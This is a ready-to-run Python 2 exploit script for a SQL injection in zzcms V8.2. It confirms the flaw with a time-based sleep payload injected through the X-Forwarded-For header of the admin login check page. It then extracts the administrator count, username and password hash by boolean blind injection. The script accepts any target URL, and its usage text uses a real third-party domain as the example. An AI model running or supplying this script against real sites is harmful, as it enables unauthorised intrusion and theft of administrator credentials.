#! /usr/bin/python
# -*- coding: utf-8 -*-
#Author:xq17
# date: 2018-02-08
# zzcms V8.2 sql注入 arg:ip

import requests
import sys
import time
import itertools

def urlFormat(url):
	if (not url.startswith("http://")) and (not url.startswith("https://")):
		url = "http://" + url
	if not url.endswith("/"):
		url = url + "/"
	return url

#进行注入
def fetch_data(vuln_page):
	#判断管理员数目
	for i in itertools.count(1):
		payload_1 = "1,1,1,-1' or substr((select count(*) from zzcms_admin),1)={} #".format(i)
		headers = {'X-Forwarded-For':payload_1}
		r1= requests.post(vuln_page,headers=headers)
		if len(r1.text.encode('utf-8')) > 400:
			print "------------"
			print "sum of manager:"+ str(i)
			print "trying fetch first manager's name and password......"
			for k in itertools.count(1):
				payload_2 = "1,1,1,-1' or length((select admin from zzcms_admin limit 0,1))={} #".format(k)
				headers = {'X-Forwarded-For':payload_2}
				r2 = requests.post(vuln_page,headers=headers)
				if len(r2.text.encode('utf-8')) > 400:
					print "length of manager's name:"+str(k)
					#打印用户名和密码
					fetch_manager(vuln_page,k)
					break
			break

#打印管理员账户和密码
def fetch_manager(vuln_page,num):
	payload = "abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_."
	username = ""
	password = ""
	for j in range(num):
		for l in payload:
			payload_3 = "1,1,1,-1' or ascii(substr((select admin from zzcms_admin limit 0,1),{},1))={} #".format(j+1,ord(l))
			headers = {'X-Forwarded-For':payload_3}
			try:
				r3 = requests.post(vuln_page,headers=headers)
				if len(r3.text.encode('utf-8')) > 400:
					username = username + l
					print 'username:'+'{0:*<{1}}'.format(username,num)
					break
			except:
				pass
	print "trying fuzz password ....."
	payload_test = "abcdefghigklmnopqrstuvwxyz0123456789"
	for j in range(32):
		#for l in payload:
		for l in payload_test:
			try:
				payload_4 = "1,1,1,-1' or ascii(substr((select pass from zzcms_admin limit 0,1),{},1))={} #".format(j+1,ord(l))
				headers = {'X-Forwarded-For':payload_4}
				r4 = requests.post(vuln_page,headers=headers)
				if len(r4.text.encode('utf-8')) > 400:
					password = password + l
					print 'password:' + '{0:*<32}'.format(password)
					break
			except:
				pass
	return None

def is_vuln(vuln_page):
	payload = "1.1.1.-1' or sleep(5)#"
	headers = {'X-Forwarded-For':payload}
	try:
		start_time = time.time()
		r2  = requests.post(vuln_page,headers=headers)
		if time.time() - start_time > 4:
			return True
		else:
			return False
	except:
		pass
def is_sql(url,retrynum = 3):
	vuln_page = url + 'admin/logincheck.php'
	try:
		response =  requests.head(vuln_page)
		code = response.status_code
		if retrynum > 0:
			if code != 200:
				print "vuln_page is not Founded,trying again  " + vuln_page
				return is_sql(url,retrynum-1)
			else:
				print "vuln_page:" + vuln_page +" was Founded,trying payload for attacking"
				print "-------------------------------------------"
				result = is_vuln(vuln_page)
				if result:
					print "Found SQL vulnerability,trying to print admin:pasword"
					fetch_data(vuln_page)
				else:
					print "Not Found SQL vulnerability"
	except Exception as e:
		print e
	return None



def main():
	# 判断是否存在注入
	if len(sys.argv) != 2:
		print " Usage:"
		print "      python sqlip.py [url] "
		print " Example:"
		print "      python sqlip.py http://baidu.com"
		print " Author:"
		print "      xq17 from mst"
		exit(1)
	url = urlFormat(sys.argv[1])
	is_sql(url)
	# vuln_page = url + 'admin/logincheck.php'
	# fetch_data(vuln_page)
if __name__ == '__main__':
 	main()
 	print "=================================="
 	print "  worked !!!!!!  " 
 	print "=================================="
 	exit(1)